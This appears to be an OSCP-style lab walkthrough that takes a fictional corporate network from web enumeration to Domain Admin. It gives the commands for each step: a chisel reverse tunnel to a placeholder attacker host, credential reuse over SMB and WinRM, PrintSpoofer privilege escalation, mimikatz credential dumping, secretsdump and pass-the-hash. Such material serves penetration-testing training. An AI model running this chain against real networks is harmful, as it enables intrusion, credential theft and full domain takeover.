
# 🔴 🧠 SCENARIO: CORPORATE NETWORK

[ Kali Attacker ]  
       |  
       | (External Network)  
       |  
[ WEB01 ]  →  [ APP01 ]  →  [ DC01 ]  
   (Linux)      (Windows)     (Domain Controller)

### 🎯 Goal:

- Compromise **WEB01**
- Pivot to **APP01**
- Escalate privileges
- Own **DC01 (Domain Admin)**

---

# 🔥 PHASE 1 — INITIAL FOOTHOLD (WEB01)

---

## 🟢 STEP 1 — Nmap

nmap -p- -sC -sV 192.168.200.10

### 🔍 Findings:

- 80 → Web server
- 22 → SSH

---

## 🟢 STEP 2 — Web Enumeration

gobuster dir -u http://192.168.200.10 -w /usr/share/wordlists/dirb/common.txt

### 🟢 Found:

/upload  
/dev  
/backup.zip

---

## 🟢 STEP 3 — Exploit Web

- Download backup:

wget http://192.168.200.10/backup.zip  
unzip backup.zip

### 🟢 Found inside:

$db_user = "appuser";  
$db_pass = "Password@123";

---

## 🟢 STEP 4 — SSH Access

ssh appuser@192.168.200.10

💥 **FOOTHOLD GAINED (WEB01)**

---

# 🔴 PHASE 2 — INTERNAL ENUMERATION (PIVOTING STARTS)

---

## 🟢 STEP 5 — Check Internal Network

ip a

### 🟢 Found:

192.168.210.0/24

👉 Internal network discovered

---

## 🟢 STEP 6 — Scan Internal Network

nmap -p 445,88,389 192.168.210.0/24

### 🟢 Found:

- `192.168.210.20` → APP01
- `192.168.210.30` → DC01

---

# 🔥 PHASE 3 — TUNNELING (VERY IMPORTANT FOR OSCP)

---

## 🔧 Use Chisel

### On Kali:

chisel server --reverse -p 8000

### On WEB01:

./chisel client ATTACKER_IP:8000 R:socks

---

## 🔧 Proxychains config:

socks5 127.0.0.1 1080

---

## 🟢 Now scan internally from Kali:

proxychains nmap -p 445,88,389 192.168.210.20

---

# 🔴 PHASE 4 — ATTACK APP01 (WINDOWS)

---

## 🟢 STEP 7 — SMB Access

Try creds from web:

crackmapexec smb 192.168.210.20 -u appuser -p Password@123

### 🟢 SUCCESS

---

## 🟢 STEP 8 — WinRM Access

proxychains evil-winrm -i 192.168.210.20 -u appuser -p Password@123

💥 **FOOTHOLD ON APP01**

---

# 🔴 PHASE 5 — PRIVILEGE ESCALATION (APP01)

---

## 🟢 STEP 9 — Run winPEAS

Upload + run:

.\winPEAS.exe

---

### 🟢 Finding:

SeImpersonatePrivilege ENABLED

---

## 🔥 STEP 10 — Exploit Token

PrintSpoofer.exe -i -c cmd

💥 **SYSTEM SHELL ACHIEVED**

---

# 🔴 PHASE 6 — ACTIVE DIRECTORY ENUMERATION

---

## 🟢 STEP 11 — Dump Credentials

mimikatz

sekurlsa::logonpasswords

---

### 🟢 Found:

svc_backup : Winter2024!

---

# 🔴 PHASE 7 — DOMAIN ENUMERATION

---

## 🟢 STEP 12 — BloodHound

bloodhound-python -u svc_backup -p Winter2024! -d corp.local -c all

---

### 🧠 BloodHound Finding:

svc_backup → Backup Operators → DC01

---

# 🔥 PHASE 8 — DOMAIN ESCALATION

---

## 🟢 STEP 13 — Dump DC Hashes

impacket-secretsdump corp.local/svc_backup:Winter2024!@192.168.210.30

---

### 🟢 Output:

Administrator NTLM HASH

---

# 🔴 STEP 14 — DOMAIN ADMIN ACCESS

---

impacket-psexec corp.local/administrator@192.168.210.30 -hashes :HASH

---

💥💥💥  
🎯 **DOMAIN OWNED (FULL COMPROMISE)**

---

# 🧠 FULL ATTACK FLOW (IMPORTANT)

---

## 🔥 Chain You Just Executed:

1. Web vuln → credentials
2. SSH foothold (WEB01)
3. Internal scan
4. Pivot using chisel
5. SMB login (APP01)
6. WinRM access
7. Priv esc (PrintSpoofer)
8. Credential dump (Mimikatz)
9. BloodHound analysis
10. DCSync / secretsdump
11. Pass-the-Hash → Domain Admin